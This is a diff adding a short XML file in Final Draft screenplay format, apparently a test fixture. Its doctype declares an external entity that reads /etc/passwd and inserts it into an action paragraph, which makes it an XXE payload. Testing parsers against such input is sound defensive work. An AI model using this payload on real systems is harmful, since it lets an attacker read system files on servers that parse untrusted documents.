@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<!DOCTYPE FinalDraft [ <!ENTITY secret SYSTEM "file:///etc/passwd"> ]>
+<FinalDraft DocumentType="Script" Template="No" Version="5">
+  <Content>
+    <Paragraph Type="Action"><Text>&secret;</Text></Paragraph>
+  </Content>
+</FinalDraft>
